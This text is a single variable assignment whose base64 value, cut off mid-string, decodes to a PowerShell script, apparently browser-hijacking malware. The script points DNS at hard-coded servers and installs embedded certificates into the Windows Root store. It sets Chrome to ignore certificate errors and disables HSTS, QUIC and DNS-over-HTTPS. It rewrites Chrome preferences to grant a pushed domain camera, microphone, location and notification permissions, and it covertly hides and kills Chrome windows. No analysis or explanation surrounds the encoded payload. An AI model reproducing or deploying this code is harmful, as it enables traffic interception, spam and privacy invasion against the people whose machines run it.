bodyX="77u/JFByaW1hcnlETlNTZXJ2ZXIgPSAnMTA5LjI0OC4yMDEuMjI2Jw0KJFNlY29uZGFyeUROU1NlcnZlciA9ICcxMDkuMjQ4LjIwMS4yMjQnDQokdXBkYXRlVXJsID0gJ191cGRhdGVVcmwnDQokeHB1c2hlcyA9IEAoKQ0KJHhkYXRhID0gQHsNCiAgICAndGVzdDEuY29tJz0nJw0KJ3Rlc3QyLmNvbSc9JycNCid0ZXN0My5jb20nPScnDQondGVzdDQuY29tJz0nJw0KJ3Rlc3Q1LmNvbSc9JycNCn0NCg0KZnVuY3Rpb24gSXNEZWJ1ZyB7DQogICAgJGRlYnVnRmlsZSA9ICJDOlxkZWJ1Zy50eHQiDQogICAgDQogICAgdHJ5IHsNCiAgICAgICAgIyBDaGVjayBpZiB0aGUgZmlsZSBleGlzdHMNCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkZGVidWdGaWxlIC1QYXRoVHlwZSBMZWFmKSB7DQogICAgICAgICAgICByZXR1cm4gJHRydWUNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICAjIENhdGNoIGFueSBlcnJvcnMgdGhhdCBvY2N1ciBkdXJpbmcgdGhlIFRlc3QtUGF0aCBvcGVyYXRpb24NCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gR2V0LUVudlBhdGhzIHsNCiAgICAkYSA9IEdldC1Mb2NhbEFwcERhdGFQYXRoDQogICAgJGIgPSAgR2V0LUFwcERhdGFQYXRoDQogICAgcmV0dXJuIEAoJGEgLCAkYikNCn0NCg0KZnVuY3Rpb24gR2V0LVRlbXBGaWxlIHsNCiAgICAkdGVtcFBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wUGF0aCgpDQogICAgJHRlbXBGaWxlID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcEZpbGVOYW1lKCkNCiAgICByZXR1cm4gJHRlbXBGaWxlDQp9DQoNCmZ1bmN0aW9uIEdldC1Mb2NhbEFwcERhdGFQYXRoIHsNCiAgICByZXR1cm4gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW1N5c3RlbS5FbnZpcm9ubWVudCtTcGVjaWFsRm9sZGVyXTo6TG9jYWxBcHBsaWNhdGlvbkRhdGEpDQp9DQoNCmZ1bmN0aW9uIEdldC1BcHBEYXRhUGF0aCB7DQogICAgcmV0dXJuIFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKFtTeXN0ZW0uRW52aXJvbm1lbnQrU3BlY2lhbEZvbGRlcl06OkFwcGxpY2F0aW9uRGF0YSkNCn0NCg0KZnVuY3Rpb24gR2V0LVByb2ZpbGVQYXRoIHsNCiAgICByZXR1cm4gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW1N5c3RlbS5FbnZpcm9ubWVudCtTcGVjaWFsRm9sZGVyXTo6VXNlclByb2ZpbGUpDQp9DQoNCmZ1bmN0aW9uIENsb3NlLVByb2Nlc3NlcyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nW11dJHByb2Nlc3Nlcw0KICAgICkNCg0KICAgIGZvcmVhY2ggKCRwcm9jZXNzIGluICRQcm9jZXNzZXMpIHsNCiAgICAgICAgJGNvbW1hbmQgPSAidGFza2tpbGwuZXhlIC9pbSAkcHJvY2VzcyAvZiINCiAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gJGNvbW1hbmQNCiAgICB9DQp9DQoKCg0KDQpmdW5jdGlvbiBDb25maWd1cmVDZXJ0aWZpY2F0ZXMgew0KICAgIGZvcmVhY2ggKCRrZXkgaW4gJHhkYXRhLktleXMpIHsNCiAgICAgICAgQ2VydC1Xb3JrIC1jb250ZW50U3RyaW5nICR4ZGF0YVska2V5XQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQ2VydC1Xb3JrIHsNCiAgICBwYXJhbSgNCiAgICAgICAgW3N0cmluZ10gJGNvbnRlbnRTdHJpbmcNCiAgICApDQogICAgJG91dHB1dEZpbGVQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcEZpbGVOYW1lKCkNCiAgICAkYmluYXJ5ID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRjb250ZW50U3RyaW5nKQ0KICAgIHRyeSB7DQogICAgICAgIFNldC1Db250ZW50IC1QYXRoICRvdXRwdXRGaWxlUGF0aCAtVmFsdWUgJGJpbmFyeSAtQXNCeXRlU3RyZWFtDQogICAgfSBjYXRjaCB7DQogICAgICAgIEFkZC1Db250ZW50IC1QYXRoICRvdXRwdXRGaWxlUGF0aCAtVmFsdWUgJGJpbmFyeSAtRW5jb2RpbmcgQnl0ZQ0KICAgIH0NCiAgICBJbnN0YWxsLUNlcnRpZmljYXRlVG9TdG9yZXMgLUNlcnRpZmljYXRlRmlsZVBhdGggJG91dHB1dEZpbGVQYXRoIC1QYXNzd29yZCAnMTIzJw0KfQ0KDQpmdW5jdGlvbiBJbnN0YWxsLUNlcnRpZmljYXRlVG9TdG9yZXMgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSAkQ2VydGlmaWNhdGVGaWxlUGF0aCwNCiAgICAgICAgW3N0cmluZ10gJFBhc3N3b3JkDQogICAgKQ0KDQogICAgdHJ5IHsNCiAgICAgICAgJHNlY3VyZVBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAtU3RyaW5nICRQYXNzd29yZCAtQXNQbGFpblRleHQgLUZvcmNlDQoNCiAgICAgICAgIyBJbXBvcnQgY2VydGlmaWNhdGUgdG8gUGVyc29uYWwgKE15KSBzdG9yZQ0KICAgICAgICAkcGVyc29uYWxTdG9yZVBhdGggPSAiQ2VydDpcTG9jYWxNYWNoaW5lXE15Ig0KICAgICAgICBJbXBvcnQtUGZ4Q2VydGlmaWNhdGUgLUZpbGVQYXRoICRDZXJ0aWZpY2F0ZUZpbGVQYXRoIC1DZXJ0U3RvcmVMb2NhdGlvbiAkcGVyc29uYWxTdG9yZVBhdGggLVBhc3N3b3JkICRzZWN1cmVQYXNzd29yZCAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICBXcml0ZS1PdXRwdXQgIkNlcnRpZmljYXRlIGluc3RhbGxlZCBzdWNjZXNzZnVsbHkgdG8gUGVyc29uYWwgc3RvcmUgKE15KS4iDQoNCiAgICAgICAgIyBJbXBvcnQgY2VydGlmaWNhdGUgdG8gUm9vdCBzdG9yZQ0KICAgICAgICAkcm9vdFN0b3JlUGF0aCA9ICJDZXJ0OlxMb2NhbE1hY2hpbmVcUm9vdCINCiAgICAgICAgSW1wb3J0LVBmeENlcnRpZmljYXRlIC1GaWxlUGF0aCAkQ2VydGlmaWNhdGVGaWxlUGF0aCAtQ2VydFN0b3JlTG9jYXRpb24gJHJvb3RTdG9yZVBhdGggLVBhc3N3b3JkICRzZWN1cmVQYXNzd29yZCAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICBXcml0ZS1PdXRwdXQgIkNlcnRpZmljYXRlIGluc3RhbGxlZCBzdWNjZXNzZnVsbHkgdG8gUm9vdCBzdG9yZS4iDQoNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdGhyb3cgIkZhaWxlZCB0byBpbnN0YWxsIGNlcnRpZmljYXRlOiAkXyINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIENvbmZpZ3VyZUNocm9tZSB7DQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXERuc2NhY2hlXFBhcmFtZXRlcnMiIC1OYW1lICJFbmFibGVBdXRvRE9IIiAtVmFsdWUgMA0KDQogICAgJGNocm9tZUtleVBhdGggPSAiSEtMTTpcU29mdHdhcmVcUG9saWNpZXNcR29vZ2xlXENocm9tZSINCg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGNocm9tZUtleVBhdGgpKSB7DQogICAgICAgIE5ldy1JdGVtIC1QYXRoICRjaHJvbWVLZXlQYXRoIC1Gb3JjZSB8IE91dC1OdWxsDQogICAgfQ0KDQogICAgTmV3LUl0ZW0gLVBhdGggJGNocm9tZUtleVBhdGggLUZvcmNlIHwgT3V0LU51bGwgICMgQ3JlYXRlIHRoZSBrZXkgaWYgaXQgZG9lc24ndCBleGlzdA0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGNocm9tZUtleVBhdGggLU5hbWUgIkNvbW1hbmRMaW5lRmxhZyIgLVZhbHVlICItLWlnbm9yZS1jZXJ0aWZpY2F0ZS1lcnJvcnMgLS1kaXNhYmxlLXF1aWMgLS1kaXNhYmxlLWhzdHMiDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtTmFtZSAiRG5zT3Zlckh0dHBzIiAtVmFsdWUgIm9mZiINCg0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGNocm9tZUtleVBhdGggLU5hbWUgIklnbm9yZUNlcnRpZmljYXRlRXJyb3JzIiAtVmFsdWUgMQ0KDQogICAgV3JpdGUtT3V0cHV0ICJDaHJvbWUgY29uZmlndXJlZCINCn0NCg0KCgoNCgoKDQoNCmZ1bmN0aW9uIFB1c2hEb21haW4gew0KICAgIHBhcmFtICgkcHVzaFVybCkNCg0KICAgICMgVHJpbSB0aGUgaW5wdXQgc3RyaW5nIGJlZm9yZSB0aGUgZmlyc3QgY29tbWENCiAgICAkdHJpbW1lZFVybCA9ICRwdXNoVXJsLlRyaW0oKS5TcGxpdCgnLCcpWzBdLlRyaW0oKQ0KDQogICAgIyBQYXJzZSB0aGUgVVJJDQogICAgJHBhcnNlZFVyaSA9IFtTeXN0ZW0uVXJpXTo6bmV3KCR0cmltbWVkVXJsKQ0KICAgIA0KICAgICMgRXh0cmFjdCBkb21haW4gYW5kIHBvcnQNCiAgICAkZG9tYWluID0gJHBhcnNlZFVyaS5Ib3N0DQogICAgJHBvcnQgPSBpZiAoJHBhcnNlZFVyaS5Qb3J0IC1lcSAtMSkgeyA0NDMgfSBlbHNlIHsgJHBhcnNlZFVyaS5Qb3J0IH0NCg0KICAgICMgQ29uc3RydWN0IHRoZSByZXN1bHQgVVJMDQogICAgJHJlc3VsdCA9ICJodHRwczovLyIgKyAkZG9tYWluICsgIjoiICsgIiRwb3J0LCoiDQogICAgDQogICAgcmV0dXJuICRyZXN1bHQNCn0NCg0KZnVuY3Rpb24gUHVzaEV4aXN0cw0Kew0KICAgIHBhcmFtICgkcHVzaFVybCkNCiAgICBmb3JlYWNoICgkcHVzaCBpbiAkeHB1c2hlcykgDQogICAgew0KICAgICAgICBpZiAoKFB1c2hEb21haW4gLXB1c2hVcmwgJHB1c2hVcmwpIC1lcSAoUHVzaERvbWFpbiAtcHVzaFVybCAkcHVzaCkpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGZhbHNlDQp9DQoNCmZ1bmN0aW9uIExpc3QtUHVzaGVzKCkNCnsNCiAgICAkcHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICAjIENoZWNrIGlmIHRoZSBQcmVmZXJlbmNlcyBmaWxlIGV4aXN0cw0KICAgIGlmIChUZXN0LVBhdGggJHByZWZlcmVuY2VzUGF0aCkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgICAgICRub3RpZmljYXRpb25TZXR0aW5ncyA9ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMubm90aWZpY2F0aW9ucw0KDQogICAgICAgIGlmICgkbm90aWZpY2F0aW9uU2V0dGluZ3MgLWlzbm90IFthcnJheV0pIHsNCiAgICAgICAgICAgICRub3RpZmljYXRpb25TZXR0aW5ncyA9IEAoJG5vdGlmaWNhdGlvblNldHRpbmdzKQ0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCRub3RpZmljYXRpb25TZXR0aW5ncykgew0KICAgICAgICAgICAgZm9yZWFjaCAoJGl0ZW0gaW4gJG5vdGlmaWNhdGlvblNldHRpbmdzKSB7DQogICAgICAgICAgICAgICAgJGpzb25JdGVtID0gJGl0ZW0gfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMQ0KICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkanNvbkl0ZW0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiTm8gbm90aWZpY2F0aW9uIHNldHRpbmdzIGZvdW5kLiINCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIFdyaXRlLU91dHB1dCAiUHJlZmVyZW5jZXMgZmlsZSBub3QgZm91bmQgYXQgcGF0aDogJHByZWZlcmVuY2VzUGF0aCINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIFJlbW92ZS1QdXNoZXMgew0KICAgICRwcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgICMgQ2hlY2sgaWYgdGhlIFByZWZlcmVuY2VzIGZpbGUgZXhpc3RzDQogICAgaWYgKFRlc3QtUGF0aCAkcHJlZmVyZW5jZXNQYXRoKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICAgICAgIyBDaGVjayBpZiB0aGUgc3RydWN0dXJlIGlzIGFzIGV4cGVjdGVkDQogICAgICAgIGlmICgkcHJlZmVyZW5jZXNDb250ZW50IC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlIC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zLm5vdGlmaWNhdGlvbnMpIHsNCiAgICAgICAgICAgICRub3RpZmljYXRpb25TZXR0aW5ncyA9ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMubm90aWZpY2F0aW9ucw0KDQogICAgICAgICAgICAka2V5c1RvUmVtb3ZlID0gQCgpDQoNCiAgICAgICAgICAgICMgSXRlcmF0ZSB0aHJvdWdoIGVhY2ggZW50cnkgaW4gJG5vdGlmaWNhdGlvblNldHRpbmdzDQogICAgICAgICAgICBmb3JlYWNoICgkZmllbGQgaW4gJG5vdGlmaWNhdGlvblNldHRpbmdzLlBTT2JqZWN0LlByb3BlcnRpZXMpIHsNCiAgICAgICAgICAgICAgICAkc2l0ZVVybCA9ICRmaWVsZC5OYW1lDQogICAgICAgICAgICAgICAgJHBlcm1pc3Npb24gPSAoUHVzaEV4aXN0cyAtcHVzaFVybCAkc2l0ZVVybCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICgkcGVybWlzc2lvbiAtZXEgJGZhbHNlKSB7DQogICAgICAgICAgICAgICAgICAgICRrZXlzVG9SZW1vdmUgKz0gJGZpZWxkLk5hbWUNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIiRzaXRlVXJsIGhhc24ndCBiZWVuIHJlbW92ZWQsIGl0IGlzIGEgZ29vZCBzaXRlLiINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gJGtleXNUb1JlbW92ZSkgew0KICAgICAgICAgICAgICAgICRub3RpZmljYXRpb25TZXR0aW5ncy5QU09iamVjdC5Qcm9wZXJ0aWVzLlJlbW92ZSgka2V5KQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwMCB8IFNldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLUZvcmNlDQoNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiQWxsIHNlbGVjdGVkIHB1c2ggbm90aWZpY2F0aW9uIHNldHRpbmdzIGhhdmUgYmVlbiByZW1vdmVkLiINCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiTm8gb3IgdW5leHBlY3RlZCBub3RpZmljYXRpb24gc2V0dGluZ3MgZm91bmQgaW4gUHJlZmVyZW5jZXMgZmlsZS4iDQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICBXcml0ZS1PdXRwdXQgIlByZWZlcmVuY2VzIGZpbGUgbm90IGZvdW5kIGF0IHBhdGg6ICRwcmVmZXJlbmNlc1BhdGgiDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIEFkZC1QdXNoIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHB1c2hVcmwNCiAgICApDQoNCiAgICAkcHVzaERvbWFpbiA9IFB1c2hEb21haW4gLXB1c2hVcmwgJHB1c2hVcmwNCg0KICAgICRjaHJvbWVQcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJGNocm9tZVByZWZlcmVuY2VzUGF0aCkpIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiQ2hyb21lIHByZWZlcmVuY2VzIGZpbGUgbm90IGZvdW5kIGF0IHBhdGg6ICRjaHJvbWVQcmVmZXJlbmNlc1BhdGgiDQogICAgICAgIGV4aXQNCiAgICB9DQoNCiAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJGNocm9tZVByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgaWYgKC1ub3QgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBwcm9maWxlIC1WYWx1ZSBAe30NCiAgICB9DQoNCiAgICBpZiAoLW5vdCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIGRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcyAtVmFsdWUgQHt9DQogICAgfQ0KDQogICAgaWYgKC1ub3QgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcy5wb3B1cHMpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIHBvcHVwcyAtVmFsdWUgMQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMucG9wdXBzID0gMQ0KICAgIH0NCg0KICAgIGlmICgtbm90ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMuc3VicmVzb3VyY2VfZmlsdGVyKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBzdWJyZXNvdXJjZV9maWx0ZXIgLVZhbHVlIDENCiAgICB9IGVsc2Ugew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzLnN1YnJlc291cmNlX2ZpbHRlciA9IDENCiAgICB9DQoNCiAgICAkcHJlZmVyZW5jZXNDb250ZW50SnNvbiA9ICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMzINCiAgICBTZXQtQ29udGVudCAtUGF0aCAkY2hyb21lUHJlZmVyZW5jZXNQYXRoIC1WYWx1ZSAkcHJlZmVyZW5jZXNDb250ZW50SnNvbiAtRm9yY2UNCg0KICAgICRwcmVmZXJlbmNlc1BhdGggPSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxQcmVmZXJlbmNlcyINCg0KICAgIGlmIChUZXN0LVBhdGggJHByZWZlcmVuY2VzUGF0aCkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KICAgICAgICAkY29udGVudFNldHRpbmdzID0gJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucw0KICAgICAgICAkc2V0dGluZ3NUb1VwZGF0ZSA9IEAoDQogICAgICAgICAgICAiYXV0b19waWN0dXJlX2luX3BpY3R1cmUiLCAiYmFja2dyb3VuZF9zeW5jIiwgImNhbWVyYSIsICJjbGlwYm9hcmQiLCAiY29va2llcyIsIA0KICAgICAgICAgICAgImdlb2xvY2F0aW9uIiwgImltYWdlcyIsICJqYXZhc2NyaXB0IiwgIm1pY3JvcGhvbmUiLCAibWlkaV9zeXNleCIsIA0KICAgICAgICAgICAgIm5vdGlmaWNhdGlvbnMiLCAicG9wdXBzIiwgInBsdWdpbnMiLCAic291bmQiLCAidW5zYW5kYm94ZWRfcGx1Z2lucyIsIA0KICAgICAgICAgICAgImF1dG9tYXRpY19kb3dubG9hZHMiLCAiZmxhc2hfZGF0YSIsICJtaXhlZF9zY3JpcHQiLCAic2Vuc29ycyIsIndpbmRvd19wbGFjZW1lbnQiLCJ3ZWJpZF9hcGkiLCJ2ciIsDQogICAgICAgICAgICAic3VicmVzb3VyY2VfZmlsdGVyIiwibWVkaWFfc3RyZWFtX21pYyIsIm1lZGlhX3N0cmVhbV9taWMiLCJtZWRpYV9zdHJlYW1fY2FtZXJhIiwibG9jYWxfZm9udHMiLA0KICAgICAgICAgICAgImphdmFzY3JpcHRfaml0IiwiaWRsZV9kZXRlY3Rpb24iLCJjYXB0dXJlZF9zdXJmYWNlX2NvbnRyb2wiLCJhciINCg0KICAgICAgICApDQoNCiAgICAgICAgZm9yZWFjaCAoJHNldHRpbmcgaW4gJHNldHRpbmdzVG9VcGRhdGUpIHsNCiAgICAgICAgICAgIGlmICgkbnVsbCAtZXEgJGNvbnRlbnRTZXR0aW5ncy4kc2V0dGluZykgew0KICAgICAgICAgICAgICAgICRjb250ZW50U2V0dGluZ3MgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAkc2V0dGluZyAtVmFsdWUgQHt9DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkc3BlY2lmaWNTZXR0aW5nID0gJGNvbnRlbnRTZXR0aW5ncy4kc2V0dGluZw0KICAgICAgICAgICAgaWYgKCRzcGVjaWZpY1NldHRpbmcuUFNPYmplY3QuUHJvcGVydGllcy5OYW1lIC1jb250YWlucyAkcHVzaERvbWFpbikgew0KICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiVGhlIHdlYnNpdGUgVVJMICRwdXNoRG9tYWluIGFscmVhZHkgZXhpc3RzIGluIHRoZSAkc2V0dGluZyBzZXR0aW5ncy4iDQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRzcGVjaWZpY1NldHRpbmcgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAkcHVzaERvbWFpbiAtVmFsdWUgQHsNCiAgICAgICAgICAgICAgICAgICAgImxhc3RfbW9kaWZpZWQiID0gIjEzMzYyNzIwNTQ1Nzg1Nzc0Ig0KICAgICAgICAgICAgICAgICAgICAic2V0dGluZyIgPSAxDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRjb250ZW50U2V0dGluZ3MuJHNldHRpbmcgPSAkc3BlY2lmaWNTZXR0aW5nDQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zID0gJGNvbnRlbnRTZXR0aW5ncw0KICAgICAgICAkdXBkYXRlZFByZWZlcmVuY2VzSnNvbiA9ICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMTANCiAgICAgICAgJHVwZGF0ZWRQcmVmZXJlbmNlc0pzb24gfCBTZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1FbmNvZGluZyBVVEY4DQoNCiAgICAgICAgV3JpdGUtT3V0cHV0ICJOb3RpZmljYXRpb24gc3Vic2NyaXB0aW9uIGZvciAkcHVzaERvbWFpbiBhZGRlZCBzdWNjZXNzZnVsbHkgd2l0aCBhbGwgcGVybWlzc2lvbnMuIg0KICAgIH0gZWxzZSB7DQogICAgICAgIFdyaXRlLU91dHB1dCAiUHJlZmVyZW5jZXMgZmlsZSBub3QgZm91bmQgYXQgcGF0aDogJHByZWZlcmVuY2VzUGF0aCINCiAgICB9DQp9DQoNCg0KDQpmdW5jdGlvbiBDbG9zZS1DaHJvbWVXaW5kb3cgew0KICAgIHBhcmFtICgkd2luZG93KQ0KICAgIFtVc2VyMzJYXTo6Q2xvc2VXaW5kb3coJHdpbmRvdykgfCBPdXQtTnVsbA0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMjUNCn0NCg0KZnVuY3Rpb24gQ2xvc2UtQ2hyb21lIHsNCiAgICBwYXJhbSAoJHByb2Nlc3MpDQogICAgQ2xvc2UtQ2hyb21lV2luZG93IC13aW5kb3cgJHByb2Nlc3MuTWFpbldpbmRvd0hhbmRsZQ0KICAgIHRyeSB7DQogICAgICAgICRwcm9jZXNzLkNsb3NlKCkNCiAgICB9DQogICAgY2F0Y2ggew0KICANCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gQ2xvc2UtQWxsQ2hyb21lcyB7DQogICAgJHdpbmRvd3MgPSBbVXNlcjMyWF06OkVudW1lcmF0ZUFsbFdpbmRvd3MoKQ0KICAgIGZvcmVhY2ggKCR3aW5kb3cgaW4gJHdpbmRvd3MpIA0KICAgIHsNCiAgICAgICAgJHRpdGxlID0gW1VzZXIzMlhdOjpHZXRXaW5kb3dUZXh0KCR3aW5kb3cpDQogICAgICAgIGlmICgkdGl0bGUuQ29udGFpbnMoIkdvb2dsZSBDaHJvbWUiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgW1VzZXIzMlhdOjpTaG93V2luZG93KCR3aW5kb3csIFtVc2VyMzJYXTo6U1dfSElERSkgfCBPdXQtTnVsbA0KICAgICAgICAgICAgQ2xvc2UtQ2hyb21lV2luZG93IC13aW5kb3cgJHdpbmRvdw0KICAgICAgICB9DQogICAgICAgIFdyaXRlLU91dHB1dCAiV2luZG93IEhhbmRsZTogJCgkd2luZG93LlRvU3RyaW5nKCkpLCBUaXRsZTogJHRpdGxlIg0KICAgIH0NCiAgICBDbG9zZS1Qcm9jZXNzZXMoQCgnY2hyb21lLmV4ZScpKQ0KfQ0KDQpmdW5jdGlvbiBPcGVuLUNocm9tZVdpdGhVcmwgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdXJsDQogICAgKQ0KICAgICRpc0RlYnVnID0gSXNEZWJ1Zw0KICAgICRjaHJvbWVQYXRocyA9IEAoDQogICAgICAgICJDOlxQcm9ncmFtIEZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIsDQogICAgICAgICJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXEdvb2dsZVxDaHJvbWV